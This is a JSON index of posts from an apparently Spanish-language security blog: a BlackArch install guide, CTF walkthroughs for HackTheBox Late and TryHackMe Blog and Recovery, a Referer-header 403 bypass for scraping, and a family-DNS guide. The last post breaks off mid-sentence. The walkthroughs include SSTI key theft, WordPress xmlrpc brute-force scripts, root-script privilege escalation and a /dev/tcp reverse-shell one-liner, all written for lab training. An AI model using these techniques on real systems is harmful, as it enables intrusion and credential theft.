[ { "title": "Personalización de blackarch", "url": "/posts/BlackArch-custom/", "categories": "Tutorial, DIY", "tags": "python, bash, curl", "date": "2023-01-04 11:00:00 -0600", "snippet": "IntroducciónEn este primer articulo del año 2023 veremos como instalar y personalizar un entorno de hacking profesional comenzando por la instalación del sistema operativo Arch Linux y toda la configuración necesaria como el idioma, la distribución de teclado, el gestor de paquetes Paru y un gestor de ventanas que hará que nuestra máquina no consuma tantos recursos además de ser súper personalizable. Después convertiremos nuestro sistema en un Black Arch con ayuda del script oficial de esta distribución y finalmente instalaremos algunos paquetes “escenciales” para poder realizar un pentest o hackeo ético en las plataformas Hack The Box, Try Hack Me o en cualquier entorno “real”. Es importatne mencionar que partiremos este tutorial tomando en cuenta que ya debemos tener instalado VirtualBox o VMWare según sea nuestra preferencia ya que solo hacen falta unas pequeñas modificaciones para que funcione correctamente.Descarga de arch Linux y creación de máquina virtualComenzamos este tutorial descargando desde la página oficial de Arch la imagen iso para la instalación, una vez descargada crearemos nuestra máquina virtual con las siguientes especificaciones: 20 GB de disco duro (se puede modificar de acuerdo al uso que le daremos) 2 GB de memoria RAM Firmware EFIPara VirtualBoxCrearemos la máquina seleccionando el botón añadir (1), asiganmos el nombre (2), seleccionamos la carpeta donde se guardará la máquina (3), seleccionamos la ruta de la imagen ISO (4) y damos click en Next.Asignamos memoria RAM (1), procesadores (2) y activamos el Firmware EFI (3)Asignamos el tamaño del disco y con esto finalizamos la creación de la máquinaPara VMwareCrearemos la máquina normalmente y después iremos a la carpeta donde se crearon los archivos de la máquina virtual, en mi caso están en Documentos/Virtual Machines/BlackArch, aquí abriremos el archivo con extensión .vmxAbrimos este archivo con cualquier editor de texto y añadimos la siguiente línea: firmware=&quot;efi&quot;Guardamos y listo.Particionado de discoDespués de hacer las modificaciones anteriores encenderemos la máquina virtual, a continuación, tomaremos en cuenta 3 particiones: sda1 como la partición de arranque, sda2 será la partición donde se instalará nuestro sistema y herramientas por lo que si asignamos más de 20GB a nuestra máquina esta partición será de mayor tamaño, finalmente la partición sda3 se habilitará como memoria de intercambio por lo que cambiará de acuerdo a sus preferencias.Para crear las particiones utilizaremos cfdisk y el siguiente esquema: sda1 300M sda2 18.5G o el espacio de su elección sda3 1.2GAhora solo ejecutamos cfdisk en la terminal y seleccionamos la opción gpt :Después nos aparecerá la siguiente pantalla donde seleccionaremos la opción NewEn la parte inferior escribimos 300m, damos enter y con esto se creará la partición sda1, ahora con las flechas del teclado seleccionamos Free space(1) y de nuevo seleccionamos New(2)Asignamos 18.5G o el tamaño que deseemos y con esto habremos creado la partición sda2. Finalmente seleccionamos Free space(1) y New(2).Para esta última parición asignamos el espacio restante (en mi caso 1.2GB), después de crear esta partición seleccionamos /dev/sda1(1) y seleccionamos la opción Type(2) del menú inferior.En el siguiente menú seleccionamos la opción EFI System.Ahora seleccionamos la partición /dev/sda3(1) y seleccionamos la opción Type(2)Para esta partición seleccionamos Linux swapSeleccionamos la opción Write(1) en la parte inferior para escribir los cambios en las particiones.Escribimos yes para confirmar.Finalmente seleccionamos Quit para salir de cfdisk.Podemos ejecutar fdisk -l para mostrar las particiones y revisar que todo esté correcto.InstalaciónDespués de particionar el disco podemos realizar una instalación automatica a través de un script que escribí o a través de una instalación manual siguiendo todos los comandos dentro del script.Instalación automáticaPara la instalación automática clonaremos mi repositorio de github, es importante aclarar que todos los comandos utilizados en mi script están basados en la guía de instalación de Arch y en la zona horaria y servidores de México. Una vez clonado, podemos cambiar cualquier archivo de configuración y los wallpapers.Ahora levantaremos un servidor http con python en la carpeta descargada, modificaremos las lineas 36, 37 y 38 con el nombre de nuestro usuario, el nombre de nuestra máquina y la ip y puerto de nuestro servidor.En la línea 45 y 46 escribiremos la contraseña del usuario estándar y del usuario root después de los 2 puntos. IMPORTANTE:Si estamos usando VirtualBox necesitaremos descomentar las líneas 65 y 66 y comentar las lineas 70 - 72.Si estamos usando VMWare necesitaremos descomentar las líneas 70 - 72 y comentar las lineas 65 y 66.Después de hacer estas modificaciones solo hace falta ejecutar la siguiente línea de comandos que descargará el script y se lo pasará a bash para ejecutarlo (recuerden cambiar la ip por la de su servidor).curl 192.168.0.2:8000/BlackArch.sh | bashUna vez que empiece el proceso de descarga e instalación debemos dejar el servidor python arriba para que el script pueda descargar todos los archivos de configuración del repositorio que clonamos así que ahora podemos ir a tomar un café o levantarnos por unos minutos. Después de que regresemos comenzará la instalación de Paru, para esto debemos introducir la contraseña del usuario estándar.Después comenzará la instalación de la powerlevel10k, nuestras herramientas de hacking y finalmente se instalará NvChad para neovim, esto con el fin de facilitar la escritura de scripts :).Cuando NVCHAD termine de instalarse aparecerá una pantalla como la siguiente:Solo debemos ejecutar el comando :q de vim para regresar a la terminal, despues reiniciamos la máquina con el comando reboot, después de reiniciar ya estará listo nuestro de hacking profesional montado en un BlackArch personalizado.ConclusionesLa instalación y configuración de nuestro entorno de hacking es realmente sencilla con el script y los archivos que he agregado al repositorio, además de ser completamente personalizable a través de los archivos de configuración.Espero les haya sido útil esta publicación para aprender más sobre los entornos Linux, sus archivos de configuración, rutas, tipos de sistemas de archivos, etc. nos vemos hasta otra publicación ;)" }, { "title": "Resolución de máquina Late - HackTheBox", "url": "/posts/HTB-Late/", "categories": "CTF, HackTheBox", "tags": "ssh, linpeas, attr, lsattr, tee, python, chmod, chown, id_rsa", "date": "2022-07-30 00:00:00 -0500", "snippet": "IntroducciónBienvenidos a mi primer writeup de Hack The Box, para comenzar, agregamos la dirección IP de la máquina en nuestro archivo /etc/hosts con el nombre late.htb para hacerlo más práctico.ResoluciónPara realizar un reconocimiento de puertos y servicios utilizamos la siguiente línea de comandos:sudo nmap -Pn -n -p- --open -sSVC --min-rate 4000 late.htbComo resultado obtuvimos lo siguiente:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)| 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)|_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-title: Late - Best online image tools|_http-server-header: nginx/1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelCuando visitamos la página en el puerto 80 encontramos un enlace hacia images.late.htb así que añadimos este enlace en el archivo /etc/hosts y cuando recargamos la página nos mostró el siguiente portal.Ya que esta aplicación procesa el texto que recibe como imagenes probamos ataques STTI (Server Side Template Injection) con diferentes fuentes, tamaños de letra y estilos. Les recomiendo visitar los siguientes enlaces para conocer más sobre como funciona esta vulnerabilidad. Server-Side Template Injections Explained podalirius.netPrimero comprobamos que se trata de un SSTI enviando la siguiente imágen:Podemos ver que entre las etiquetas p de la respuesta viene el resultado de la evaluación hecha por python.Una vez comprobada la injección de plantilla veremos si podemos ejecutar código directamente desde el interprete de python llamando al modulo os, en este caso llamaremos a id para ver el id del usuario actual.La aplicación respondió con el siguiente id, lo cual me hizo suponer que el usuario root es quien está ejecutando el aplicativo:Para comprobarlo, ahora ejecutamos whoami esperando el nombre del usuario actual:Sin embargo, como respuesta obtuvimos una cadena vacía:Pero no hay que preocuparnos ya que podemos utilizar el comando who para ver los usuarios que tienen una sesión iniciada en la máquina.Una vez que recibimos la respueta de la aplicación podemos ver algo como lo siguiente.Recordando el escaneo de nmap pudimos ver el puerto 22 abierto y ya que tenemos el nombre del usuario buscamos su id_rsa en su carpeta personal con la siguiente imagen:En la respuesta podemos ver la id_rsa completa del usuario por lo cual ahora podemos conectarnos por ssh.Recordemos que debemos cambiar los permisos con chmod 400 id_rsa ya que de lo contrario ssh nos dará un error y no nos dejará conectarnos.Bandera user.txtYa que nos conectamos a la máquina listamos el directorio actual y podemos ver la bandera user.txt.Bandera root.txtPara conseguir la bandera del usuario root utilizamos linpeas.sh para enumerar el sistema y encontrar un vector para escalar privilegios. Los resultados de linpeas muestran el script /usr/local/sbin/ssh-alert.sh, al revisar los permisos podemos ver que somos el propietario y tenemos permisos de lectura, escritura y ejecución, además, al hacer un cat al archivo vemos que este script envía un correo de alerta al usuario root@late.htb.Despues, con pspy podemos ver que este script lo está ejecutando el usuario root cuando se hace un login por ssh, además, cuando intentamos editar este script nos apareció un error lo cual es raro ya que somos los propietarios de este scriot además de que tenemos los permisos para editarlo, pero al listar los atributos del archivo con lsattr podemos ver que está activo el atributo a (append), lo cual solo nos permitirá agregar contenido más no modificarlo, sabiendo esto, ejecutamos la siguiente línea de comandos:echo -e &quot;cp /root/root.txt /home/svc_acc/root.txt\\nchown svc_acc /home/svc_acc/root.txt&quot; | tee -a /usr/local/sbin/ssh-alert.shYa que el script es ejecutado por el usuario root, con estas instrucciones estamos copiando el archivo root.txt hacía nuestro directorio personal y poniendonos como propietarios a nosotros.En este caso la bandera root en HTB siempre se encuentra en ese directorio pero por ejemplo pudimos cambiar los permisos de la /bin/bash, copiar la id_rsa del usuario root si es que la hubiera, lanzar una reverse shell, etc.Para que se ejecute el script basta con salir de ssh, volver a iniciar sesión y ahí tendremos nuestro archivo root.txtConclusionesEsta máquina me gustó mucho ya que es la primera en HTB que soluciono, además de que aprendí más sobre python y SSTI en Flask y de igual manera sobre los atributos en los archivos de linux. Espero que les haya gustado este writeup, nos vemos en el siguiente post ;)." }, { "title": "Resolución de máquina Blog - TryHackMe", "url": "/posts/THM-Blog/", "categories": "CTF, TryHackMe", "tags": "wordpress, smbclient, nmap, strings, scripting, bash, find, suid, radare2", "date": "2022-07-15 00:00:00 -0500", "snippet": "IntroducciónBienvenidos a mi página y a este post donde veremos como solucionar la máquina Blog de TryHackMe.La resolución de esta máquina la realizamos con la comunidad de Twitch y va dedicada a nuestro amigo EL MALDITO ;).Para comenzar, tenemos que agregar la dirección IP de la máquina en nuestro archivo /etc/hosts con el nombre blog.thm.ResoluciónPara realizar un reconocimiento de puertos y servicios utilizamos la siguiente linea de comandos:sudo nmap -Pn -n -p- --open -sSVC --min-rate 4000 blog.thmComo resultado obtuvimos lo siguiente:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernelComenzando por el puerto 22 probamos el script ssh-brute de nmap para un pequeño ataque de fuerza bruta, sin embargo, no se obtuvieron credenciales válidas:nmap -p22 --script ssh-brute blog.thm...PORT STATE SERVICE22/tcp open ssh| ssh-brute: | Accounts: No valid accounts found|_ Statistics: Performed 1424 guesses in 602 seconds, average tps: 2.4Nmap done: 1 IP address (1 host up) scanned in 603.74 secondsAhora seguimos con los puertos 139 y 445 que corresponden a SMB por lo cual utilizamos smbclient con una sesión nula para tratar de enumerar los recursos comparitdos y obtenemos lo siguiente:smbclient -N -L blog.thm...SHARESCuarta y quinta FlagYa que tenemos el puerto 80 abierto, ejecutamos whatweb blog.thm para identificar la tecnología utilizada por la página web y podemos ver que se trata de un CMS (Content Management Systems) WorPress en la versión 5.0:http://blog.thm [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.3.160], MetaGenerator[WordPress 5.0], PoweredBy[-wordpress,-wordpress,,WordPress,WordPress,], Script[text/javascript], Title[Billy Joel&amp;amp;#039;s IT Blog &amp;amp;#8211; The IT blog], UncommonHeaders[link], WordPress[5.0]Afortunadamente, wordpress cuenta con una API que nos permite gestionar ciertos aspectos a través de Json y podemos aprovecharla en esta máquina para consultar todos los usuarios en http://blog.thm/wp-json/wp/v2/users/.ExplotaciónPara explotar el sitio wordpress aprovechando la API escribimos 3 scripts en Bash que realizan lo siguiente: Enumerar usuarios Enumerar metodos Ataque de fuerza bruta Estos scripts están disponibles en mi repositorio WP-Hacking para su uso y modificación ;)Scripts realizadosLos siguientes 3 Scripts en bash los fuimos escribiendo y explicando en vivo con la comunidad de Twitch comenzando por getUsers.sh.getUsers.shPara poder usar este script necesitamos ejecutar sudo apt install jq para isntalar jq que nos ayudará a procesar mas fácilmente respuesta Json. Una vez instalado, basta con hacer un ./getUsers.sh blog.thm y el script guardará los usuarios encontrados en un archivo de nombre usuarios-wp.txt#!/bin/bashif [[ -z $@ ]]; then echo &quot;Modo de uso: $0 HOST&quot; exit 1fihost=&quot;$1&quot;usuario=&quot;A&quot;i=0while [[ -n $usuario ]]; do usuario=$(curl -s $host/wp-json/wp/v2/users | jq &quot;.[$i][\\&quot;slug\\&quot;]&quot; | tr -d &#39;&quot;&#39;) if [[ $usuario == &quot;null&quot; ]]; then exit 0 elif [[ -z usuario ]]; then if [[ -z usuario=$(curl -s &quot;$host/?rest_route=/wp/v2/users&quot; | jq .[$i][\\&quot;slug\\&quot;] | tr -d &#39;&quot;&#39;) ]]; then echo &quot;[x] No se encontraron usuarios :c&quot; exit 1 fi fi echo &quot;[+] Usuario: $usuario&quot; echo $usuario &amp;gt;&amp;gt; usuarios-wp.txt i=$i+1donegetMethods.shPara este script necesitamos utilizar xmlrpc.php el cual es un sistema que permite actualizaciones remotas a WordPress desde otras aplicaciones, concretamente utilizaremos system.listMethods para listar todos los métodos permitidos, sin embargo, solo nos interesa que esté habilitado wp.getUsersBlogs#!/bin/bashif [[ -z $@ ]]; then echo &quot;Modo de uso: $0 HOST&quot; exit 1fihost=$1echo &quot;&amp;lt;methodCall&amp;gt; &amp;lt;methodName&amp;gt;system.listMethods&amp;lt;/methodName&amp;gt;&amp;lt;/methodCall&amp;gt;&quot; &amp;gt; datos.xmlcurl -s &quot;$host/xmlrpc.php&quot; -d @$datos_xmlrm datos.xmlBuscando en el cuerpo de la respuesta podemos ver que nuestro método wp.getUsersBlogs está habilitado }:).bruter.shwp.getUsersBlogs nos permite consultar los blogs creados por un usuario específico pero para poder obtenerlos debemos autenticarnos como un usuario válido de WordPress, gracias a getUsers.sh ya debemos tener los usuarios válidos en el archivo usuarios-wp.txt ahora solo resta ejecutar nuestro script y pasarle como parametro el host a atacar y el diccionario pero por defecto utiliza el diccionario de nmap /usr/share/nmap/nselib/data/passwords.lst../bruter.sh #!/bin/bashif [[ -z $@ ]]; then echo &quot;Modo de uso: $0 [HOST] [DICCIONARIO]&quot;fihost=&quot;$1&quot;dict=&quot;$2&quot;for user in $(cat usuarios-wp.txt); do for psw in $(cat $dict); do echo &quot; &amp;lt;methodCall&amp;gt; &amp;lt;methodName&amp;gt;wp.getUsersBlogs&amp;lt;/methodName&amp;gt; &amp;lt;params&amp;gt; &amp;lt;param&amp;gt;&amp;lt;value&amp;gt;$user&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt; &amp;lt;param&amp;gt;&amp;lt;value&amp;gt;$psw&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt; &amp;lt;/params&amp;gt; &amp;lt;/methodCall&amp;gt; &quot; &amp;gt; datos.xml echo &quot;Probando $user:$psw&quot; if [[ ! $(curl -s &quot;$host/xmlrpc.php&quot; -d @&quot;datos.xml&quot; | grep &quot;Incorrect&quot; &amp;amp;) ]]; then echo &quot;[+] $user:$psw&quot; rm datos.xml exit 0 fi; wait rm datos.xml donedoneUna vez que obtuvimos las credenciales podemos iniciar sesión en http://blog.thm/wp-admin/ y lo primero que veremos sera el panel de administración:Después de hacer una exploración podemos ver que no tenemos permisos administrativos, entonces vamos a utilizar searchsploit para buscar un exploit de la versión de wordpress que detectamos y encontramos un exploit de metasploit, lo configuramos y lanzamos para obtener una sesión de meterpreterflag user.txtAhora vamos al directorio home del usuario bjoel para obtener la bandera pero el archivo tiene lo siguiente:Ahora buscamos binarios con SUID para escalar privilegiosfind / -type f -perm -4000 2&amp;gt;/dev/nullEncontramos que checker tiene estos permisos pero al ejecutarlo solo se imprime Not an AdminPara analizarlo mejor descargamos el archivo a nuestra maquina y vamos a analizarlo con radare2, encontramos la cadena admin en la dirección 0x722 que es pasada a la función getenv ademaś vemos una comparación a 0 en la dirección 0x737 en decir, si está vacía la variable admin se hará un salto a 0x75a, imprimirá Not an admin y saldrá del programa.Para configurar la variable admin solo hacemos un export admin=loqueseaxd ya que solo necesita estar configurada y después ejecutamos checker de nuevo para obtener una shell de root.Bandera 1, 2 y 3Ahora con permisos de root buscamos la bandera user.txt:find / -type f -name user.txt 2&amp;gt;/dev/nullY terminamos con la bandera root.txt en /root/ConclusionesAsí terminamos con esta máquina, espero les haya gustado y les haya sido util, nos vemos en otro post ;)" }, { "title": "Bypass de código 403 Forbidden en Nginx", "url": "/posts/Bypass-Nginx-403-Forbbiden/", "categories": "Tutorial, DIY", "tags": "scraping, powershell", "date": "2022-05-03 11:43:00 -0500", "snippet": "IntroducciónHace unos días estaba haciendo scraping con powershell y necesitaba descargar archivos (concretamente imágenes) de un sitio web, pero me encontré con el problema que esta página, One.com de ahora en adelante, carga las imágenes desde un sitio externo Piece.com de ahora en adelante ;)Además, cuando accedí a las imagenes directamente en Piece.com el servidor Nginx me responde con un código 403 Forbidden es por eso que en este post les enseñaré el procedimiento para obtener las URL’s y automatizar la descarga de las imágenes además de hacer un bypass con una cabecera muy sencilla.AnalisisLa url inicial tiene la siguiente estructura: One.com/viewer/1000 y cuando ingresamos con un navegador luce más o menos así:Además arriba y abajo de la imagen podemos ver un selector con el numero 1 al 22 y cada vez que cambiamos de selector por ejemplo 10, este numero se pone al final de nuestra url.La imagen a descargar es lo primero que se ve, y al abrir el inspector de elementos (Ctrl+C) y seleccionar la imágen me di cuenta que One.com carga el recurso desde una estructura img1.Piece.com/uploads/AAAAMMDD/abc123/xyz.jpg.iLa imágen no tiene un nombre seriado, por ejemplo, 0001_org.jpg esto evita el problema con IDOR’s pero complicó el trabajo de scraping ya que la imágen tiene un nombre aleatorio para el selector 2, 3 ,4 , etc. Además, cuando quería abrir la imágen directamente con la url encontrada, el servidor responde con un 403 Forbidden.Aquí abrí el inspector del navegador y me dí cuenta que en el apartado de red cada que recargaba la página el server arrojaba el mismo código de estado.Después de pasar un rato comparando las peticiones, recursos cargados y finalmente las cabeceras de la petición, me dí cuenta que cuando One.com carga la imagen desde Piece.com envía la cabecera Refer: https://One.comEsta cabecera sirve para indicarle al servidor Piece.com que el recurso se está solicitando o se está visitando desde One.com. Esta información puede ser usada para analytics, loggeo, cacheo y otras funciones, para saber más pueden visitar el siguiente enlace: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/RefererComo prueba edité y reenvié la petición con el navegador agregandole la cabecera Refer: One.com la finalComo resultado el server me regresó la imagen sin restricciones y haciendo más pruebas encontré que no hace falta agregar más cabecerasCódigoDespués de ver el comportamiento del server empecé a hacer el script que me permitiera automatizar la descarga de las imágenes en cada selector. Aquí el script final:$url = &quot;https://One.com/viewer/1000&quot;$cabeceras=@{&#39;Referer&#39; = &#39;https://One.com/&#39;}$carpeta = &quot;Descarga\\\\1000&quot;if(!(Test-Path -Path $carpeta)){ New-Item -ItemType Directory -Path $carpeta Write-Host &quot;Ya existe el directorio&quot; $carpeta}for($i=1;$i -le 22; $i++){ $datos = Invoke-WebRequest -Uri &quot;$($url)/$($i)&quot; -UseBasicParsing $datos.Content -match &#39;&amp;lt;img src=&quot;(?&amp;lt;IMAGEN&amp;gt;.*.jpg)&quot;&#39; $salida=&quot;$($carpeta)\\\\$($i).jpg&quot; if($i -le 9) { $salida=&quot;$($carpeta)\\\\0$($i).jpg&quot; } Invoke-WebRequest -Headers $cabeceras -Uri $Matches.IMAGEN -OutFile $salida -UseBasicParsing Start-Sleep -Milliseconds 2000}Explicación del códigoEn la primera línea declaramos la variable $url que apunta a la dirección del grupo de imagenes que vamos a descargar, asignamos la cabecera refer a la variable $cabecera para descargar la imagen sin error y declaramos el nombre de la carpeta donde se guardarán las imagenes.$url = &quot;https://One.com/viewer/1000&quot;$cabeceras=@{&#39;Referer&#39; = &#39;https://One.com/&#39;}$carpeta = &quot;Descarga\\\\1000&quot;Este bloque if crea la carpeta de descarga si no existe.if(!(Test-Path -Path $carpeta)){ New-Item -ItemType Directory -Path $carpeta}Inicio de ciclo for de 1 a 22 que corresponde a cada selector.for($i=1;$i -le 22; $i++)Se concatena $url y $i y quedaría https://One.com/viewer/1000/1, se hace una petición y la respuesta se almacena en $datos.$datos = Invoke-WebRequest -Uri &quot;$($url)/$($i)&quot; -UseBasicParsingAquí utilicé -match para que busque en la respuesta ($datos.Content) la etiqueta HTML img src= y que concretamente guarde el valor de src, es decir, la url de la imágen en un campo que se llamará IMAGEN, con los parentesis estamos indicando el patrón a buscar y la expresion regular sería algo como esto: \\&quot;.*\\.jpg\\&quot;$datos.Content -match &#39;&amp;lt;img src=&quot;(?&amp;lt;IMAGEN&amp;gt;.*.jpg)&quot;&#39;$salida indica la estructura del nombre de la imagen y junto con el bloque if le dan orden a las imagenes, cuando $i vale menos que 9 se le agregará un 0 al nombre del archivo, así quedaría 01.jpg 02.jpg 03jpg, etc.$salida=&quot;$($carpeta)\\\\$($i).jpg&quot;if($i -le 9){ $salida=&quot;$($carpeta)\\\\0$($i).jpg&quot;}Finalmente, se hace una petición enviando la cabecera Refer, usamos el campo IMAGEN del objeto Matches como url, le indicamos que guarde la respuesta como un archivo con el nombre de la variable $salida y después esperará 2 segundos por que de lo contrario el sitio nos banea por demasiadas peticiones en un lapso de tiempo muy corto.Invoke-WebRequest -Headers $cabeceras -Uri $Matches.IMAGEN -OutFile $salida -UseBasicParsingStart-Sleep -Milliseconds 2000ConclusionesEl scraping nos permite automatizar muchas tareas cuando estamos en busca de archivos, sin embargo, muchos servidores limitan el acceso a los recursos con este tipo de restricciones por lo cual es importante conocer estas técnicas simples pero eficaces ;)." }, { "title": "Bloquea contenido malicioso con los DNS de cloudflare", "url": "/posts/Bloquedo-de-sitios-maliciosos/", "categories": "Tutorial, DIY, Windows, Android", "tags": "DNS, Configuración de red, Bloquedo de Malware", "date": "2022-01-19 12:00:00 -0600", "snippet": "IntroducciónBienvenidos a este tutorial donde aprenderan a bloquear malware y/o sitios con contenido para adultos al modificar una configuración muy sencilla en los ajustes de red en nuestros dispositivos móviles o computadoras pero primero debemos entender que es un DNS. La siguiente imagen muestra un diagrama sencillo sobre el funcionamiento de un DNS: El cliente hace una consulta al dominio youtube.com el DNS traduce el nombre de dominio a la ip del sitio youtube.comUn DNS es un sistema que nos facilita la traducción de las feas direcciones IP en nombres de dominios más bonitos para el entendimiento humano, sin embargo, para las máquinas se siguen utilizando las IP’s, pero ¿Qué pasaría si visitaramos un sitio con contenido malicioso?. Muy fácil, el DNS nos respondería como lo ha venido haciendo desde tiempos inmemorables ya que los DNS’s por defecto no validan si el sitio a resolver a sido catalogado como malicioso, con malware o si se trata de un sitio con contenido para adultos :(.Es por esto que en 2008 la empresa CloudFlare dió a conocer su familia de DNS’s 1.1.1.1 For Families, un sistema de resolución de DNS seguro, rápido, gratuito y que prioriza la privacidad para que todos podamos disponer de esta línea de defensa adicional sin restricción alguna. 1.1.1.1 for Families incluye sólidas garantías de privacidad y tiene la finalidad de bloquear sitios con Malware, Contenido para adultos o bloquear ambos según sean nuestras necesidades.¿Cómo empezar a usarlo?Para poder usar esta línea de defensa primero debemos elegir la opción que más se adapte a nuestras necesidades: Bloqueo de malware DNS Primario 1.1.1.2 DNS Secundario 1.0.0.2 Bloqueo de malware y contenido para adultos DNS Primario 1.1.1.3 DNS Secundario 1.0.0.3 Una vez que elíjamos una opción, basta con cambiar la configuración de DNS de nuestros nuestros dispositivos. Para ello veremos primero como realizarlo en android y posteriormente en Windows ya que son los dispositivos más comunes entre los usuarios.AndroidComo primer paso, debemos abrir la configuración de Wi-Fi de nuestro dispositivo al bajar la barra de estado y dejando presionado sobre el ícono de Wi-Fi para después ir a los detalles de la red en la que estemos conectados.A continuación vamos a cambiar la configuración de IP por una dirección estática que no esté siendo ocupada por otro dispositivo. Recomiendo poner un valor arriba de 100 para estar seguros y no entrar en conflictos de direccionamiento ;).Por lo general nuestra Puerta de Enlace o Router tiene la primera dirección de nuestra red (en mi caso 10.0.0.1) y en longitud de prefijo ponemos 24 o la longitud que tengamos configurada, finalmente, en DNS primario y DNS Secundario ponemos la opción que hayamos elegido, en este ejemplo utilicé el bloqueo de Malware. Con todas estas modificaciones deberiamos tener algo como lo siguiente:Guardamos los cambios realizados y con esto terminaríamos con la configuración en Android.WindowsPara windows debemos empezar haciendo click derecho en el ícono de conexión en la barra de tareas y después seleccionar la opción Abrir configuración de red e internetA continuación se abrirá la venta de configuración y seleccionaremos el botón Propiedades de la red en la que estemos conectadosEn la nueva ventana nos desplazaremos hacia abajo hasta encontrar la sección Configuración de IP donde seleccionaremos el botón editar y después seleccionaremos la opción Manual del menú desplegableFinalmente activamos el interruptor de IPv4 y al igual que en Android agregamos la dirección IP, Puerta de enlace, longitud del prefijo y, en este caso, los DNS de bloqueo de malware y contenido para adultos, recuerden guardar los cambios antes de salir.Y ¡listo! con estas configuraciones tendremos agregada una capa extra de seguridad para navegar y mantenernos más seguros en la web. Gracias por visitar mi página, espero que te haya sido útil y nos vemos hasta otra publicación ;)." }, { "title": "Resolución de máquina Recovery - TryHackMe", "url": "/posts/THM-Recovery/", "categories": "CTF, TryHackMe", "tags": "bash, ssh, strings, reversing, malware, reverse shell, scp, echo, sed, python scripting", "date": "2021-11-25 00:00:00 -0600", "snippet": "IntroducciónBienvenidos a mi página y a este post donde veremos como solucionar la máquina Recovery de TryHackMe. Cabe aclarar que en esta máquina no estaremos vulnerando nada sino todo lo contrario, ayudaremos a Alex a solucionar y recuperar los archivos que fueron eliminados por un Malware que le hicieron instalar a través de un ataque de Spear Phishing vía e-mail, dicho mensaje se muestra acontinuación: Hi Alex,A recent security vulnerability has been discovered that affects the web server. Could you please run this binary on the server to implement the fix?Regards Teo Alex nos da las credenciales de SSH además de brindarnos una interfaz web donde veremos las banderas por cada reparación aplicada al daño causado por el malware fixutil, podemos acceder a esta interfaz en la misma máquina a través del puerto 1337 (por que somos muy hackers).Username: alexPassword: madelineResoluciónPrimeramente nos conectamos por SSH con las credenciales que Alex nos dio, y como nos contó, se imprime el texto YOU DIDN’T SAY THE MAGIC WORD y después de unos instantes se cierra completamente la conexión, pero si tecleamos CTRL+C mientras se imprime el mensaje, podemos escribir bash para abrir una nueva instancia de la bash y vamos a poder ejecutar ordenes. Nota: alternativamente podemos escribir sh y de esta manera la línea de comandos no morirá, esto lo explicaremos más adelante ;)Flag 0Ya que linux lee y ejecuta la ordenes dentro del archivo .bashrc al principio de la conexión, podemos intuir que el mensaje YOU DIDN’T SAY THE MAGIC WORD está dentro de dicho archivo en una orden que lo imprime en todo momento, y al abrirlo con vim podemos ver en la siguiente imagen que efectivamente fue así, para obtener la flag 0 debemos comentar o eliminar esta línea.Flag 1Pero después de cierto tiempo se sigue cerrando la conexión, entonces puede tratarse de una tarea cron que se ejecuta en intervalos de tiempo. Para ver las tareas programadas hacemos un ls -la /etc/cron.d/ lo que nos muestra una tarea de nombre evil, al hacer un cat /etc/cron.d/evil podemos ver que la tarea ejecuta lo siguiente:Cuando listamos los permisos de este script, podemos ver que tenemos permisos rwx (lectura, escritura y ejecución) por lo cual lo abrimos con vim y podemos ver un ciclo for que busca los PID (Process ID) de todos los procesos con nombre bash que se estén ejecutando y va haciendo un kill a cada uno de ellos, es por esto que debemos comentar o elimnar esta línea para que no se muera nuesta sesión SSH y podamos conseguir la flag 1.Análisis de fixutil con stringsDespués de realizar la modifiación, no encontramos pistas para continuar con la reparación del daño, es por esto que utilizamos la herramienta strings para obtener todas las cadenas imprimibles dentro del ejecutable fixutil y de esta manera, realizar un ‘reversing’ y poder analizar lo cambios realizados por este malware.Al revisar las cadenas obtenidas, nos encontramos con lo que parecen ser nombres de variables y funciones (index_of_encryption_key, webfile_names, XOREncryptWebFiles, encryption_key_dir, rand_string, GetWebFiles, LogIncorrectAttempt, XORFile) lo que nos hace suponer que se aplicó un “cifrado” XOR a los archivos, además, podemos notar lo que parecen ser las tareas ejecutadas por fixutil: El archivo en la siguiente ruta /opt/.fixutil/backup.txt parece sospechoso y solo tiene permisos el usuario propietario (root). Se ejecutó la siguiente línea de comandos /bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so la cual mueve el archivo logging.so hacia el directorio /lib/x86_64-linux-gnu/ con el nombre oldliblogging.so. Se añade una llave ssh al archivo de llaves autorizadas del usuario root Se agrega el usuario security en el grupo de usuarios con privilegios de root además de cambiarle la contraseña a la que se puede ver en la imagen La creación de brilliant_script y la tarea cron evil La modificación del archivo .bashrc de alex Esta línea de comandos se ejecutó antes de la tarea 2: /bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so la cual copia el archivo liblogging.so hacía el directorio /tmp/ con el nombre logging.so pero se deduce que se realizó alguna modificación en algún punto. Se ejecuta la el módulo liblogging.soDado que las tareas identificadas se realizaron con privilegios elevados y ya que brilliant_script se ejecuta con privilegios de root, podemos aprovechar los permisos de escritura sobre este archivo y establecer una reverse shell con netcat agregando lo siguiente:bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/IP/PUERTO 0&amp;gt;&amp;amp;1&#39; Nota: Sustituir IP por nuestra IP y PUERTO por el puerto deseadoFlag 2Una vez obtenida nuestra reverse shell con privilegios elevados, analizamos los archivos .so modificados con la herramienta head y podemos ver los iguiente para el archivo liblogging.so:Y el archivo oldliblogging.so muestra lo siguiente:Debido a los cambios realizados 